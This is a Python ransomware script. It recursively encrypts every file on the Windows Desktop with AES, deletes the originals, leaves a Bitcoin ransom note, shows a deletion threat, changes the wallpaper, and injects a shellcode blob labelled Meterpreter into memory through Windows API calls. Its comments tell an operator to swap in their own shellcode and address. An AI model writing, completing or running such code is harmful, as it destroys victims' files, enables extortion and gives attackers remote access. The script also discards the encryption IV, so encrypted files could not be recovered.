import os
import time
import ctypes  # For interacting with Windows API
import random
from Crypto.Cipher import AES  # PyCryptodome
from Crypto.Random import get_random_bytes

# Generate a random AES key
aes_key = get_random_bytes(32)  # 256-bit key

# Placeholder for Meterpreter shellcode (REPLACE THIS!)
payload = b"\xb8\x13\xb0\x68\xf6\xdb\xd8\xd9\x74\x24\xf4\x5f\x31\xc9"
"\xb1\x59\x31\x47\x14\x03\x47\x14\x83\xef\xfc\xf1\x45\x94"
"\x1e\x7a\xa5\x65\xdf\xe4\x97\xb7\x56\x01\xb3\xbc\x3b\xf9"
"\xb7\x91\xb7\x72\x95\x01\x43\xf6\x32\x1b\xac\xf9\xf5\x11"
"\x74\x34\x3a\x09\x44\x57\xc6\x50\x99\xb7\xf7\x9a\xec\xb6"
"\x30\x6d\x9a\x57\xec\x39\xef\xf5\x01\x4d\xad\xc5\x20\x81"
"\xb9\x75\x5b\xa4\x7e\x01\xd7\xa7\xae\xb9\x6c\xff\x6e\xb2"
"\x3b\x18\x6e\x17\x3e\xd1\x04\xab\x70\x1d\xad\x58\x46\x6a"
"\x2f\x88\x96\xac\x9c\xf5\x16\x21\xdc\x32\x90\xda\xab\x48"
"\xe2\x67\xac\x8b\x98\xb3\x39\x0b\x3a\x37\x99\xef\xba\x94"
"\x7c\x64\xb0\x51\x0a\x22\xd5\x64\xdf\x59\xe1\xed\xde\x8d"
"\x63\xb5\xc4\x09\x2f\x6d\x64\x08\x95\xc0\x99\x4a\x71\xbc"
"\x3f\x01\x90\xab\x40\xea\x6a\xd4\x1c\x7c\xa6\x19\x9f\x7c"
"\xa0\x2a\xec\x4e\x6f\x81\x7a\xe2\xf8\x0f\x7c\x73\xee\xaf"
"\x52\x3b\x7f\x4e\x53\x3b\xa9\x95\x07\x6b\xc1\x3c\x28\xe0"
"\x11\xc0\xfd\x9c\x1b\x56\xf4\x60\x1e\xa9\x60\x62\x1e\xa4"
"\x2c\xeb\xf8\x96\x9c\xbb\x54\x57\x4d\x7b\x05\x3f\x87\x74"
"\x7a\x5f\xa8\x5f\x13\xca\x47\x09\x4b\x63\xf1\x10\x07\x12"
"\xfe\x8f\x6d\x14\x74\x25\x91\xdb\x7d\x4c\x81\x0c\x1a\xae"
"\x59\xcd\x8f\xae\x33\xc9\x19\xf9\xab\xd3\x7c\xcd\x73\x2b"
"\xab\x4e\x73\xd3\x2a\x66\x0f\xe2\xb8\xc6\x67\x0b\x2d\xc6"
"\x77\x5d\x27\xc6\x1f\x39\x13\x95\x3a\x46\x8e\x8a\x96\xd3"
"\x31\xfa\x4b\x73\x5a\x00\xb5\xb3\xc5\xfb\x90\xc7\x02\x03"
"\x66\xe0\xaa\x6b\x98\xb0\x4a\x6b\xf2\x30\x1b\x03\x09\x1e"
"\x94\xe3\xf2\xb5\xfd\x6b\x78\x58\x4f\x0a\x7d\x71\x11\x92"
"\x7e\x76\x8a\x25\x04\xf7\x2d\xc6\xf9\x11\x4a\xc7\xf9\x1d"
"\x6c\xf4\x2f\x24\x1a\x3b\xec\x13\x15\x0e\x51\x35\xbc\x70"
"\xc5\x45\x95"  # Example - replace with your actual shellcode

def inject_payload():
    # Allocate memory for the payload
    PAGE_READWRITE = 0x04
    PAGE_EXECUTE_READ = 0x20
    MEM_COMMIT = 0x1000
    MEM_RESERVE = 0x2000

    exec_mem = ctypes.windll.kernel32.VirtualAlloc(0, len(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)

    # Copy the payload to the allocated memory
    buf = ctypes.create_string_buffer(payload)
    ctypes.windll.kernel32.RtlMoveMemory(exec_mem, ctypes.addressof(buf), len(payload))

    # Change memory protection to executable
    old_protect = ctypes.c_ulong(0)
    ctypes.windll.kernel32.VirtualProtect(exec_mem, len(payload), PAGE_EXECUTE_READ, ctypes.byref(old_protect))

    # Create a new thread to execute the payload
    thread = ctypes.windll.kernel32.CreateThread(0, 0, exec_mem, 0, 0, 0)
    ctypes.windll.kernel32.WaitForSingleObject(thread, -1)  # INFINITE wait

def encrypt_file(filename, key):
    try:
        with open(filename, "rb") as input_file:
            file_data = input_file.read()

        cipher = AES.new(key, AES.MODE_CFB, get_random_bytes(AES.block_size)) # Use CFB mode
        ciphertext = cipher.encrypt(file_data)

        encrypted_filename = filename + ".locked"  # Append extension
        with open(encrypted_filename, "wb") as output_file:
            output_file.write(ciphertext)

        os.remove(filename)  # Delete original file

    except Exception as e:
        print(f"Error encrypting {filename}: {e}")

def encrypt_directory(directory, key):
    try:
        for item in os.listdir(directory):
            full_path = os.path.join(directory, item)
            if os.path.isfile(full_path):
                encrypt_file(full_path, key)
            elif os.path.isdir(full_path):
                encrypt_directory(full_path, key)  # Recursive call
    except Exception as e:
        print(f"Error processing {directory}: {e}")

def drop_ransom_note():
    try:
      desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
      ransom_note_path = os.path.join(desktop_path, "READ_ME.txt")

      with open(ransom_note_path, "w") as note_file:
          note_file.write("Your files are encrypted! Send 0.01 BTC to: 1FakeBitcoinAddressXYZ\n") # Replace with your fake address
    except Exception as e:
      print(f"Error creating ransom note: {e}")

def start_timer():
    time.sleep(86400)  # 24 hours in seconds
    ctypes.windll.user32.MessageBoxW(0, "Your files will be deleted in 24 hours if payment is not made!", "WARNING", 0x10 | 0x30) # MB_OK | MB_ICONWARNING

def change_wallpaper(wallpaper_path):
    try:
        # Set the wallpaper
        SPI_SETDESKWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, wallpaper_path, 0)
    except Exception as e:
        print(f"Error changing wallpaper: {e}")

def main():
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

    # Change the wallpaper to wallpaper.jpg
    wallpaper_path = os.path.join(desktop_path, "wallpaper.jpg")
    change_wallpaper(wallpaper_path)

    encrypt_directory(desktop_path, aes_key) # Encrypt everything on desktop

    drop_ransom_note()
    start_timer()
    inject_payload()

if __name__ == "__main__":
    main()
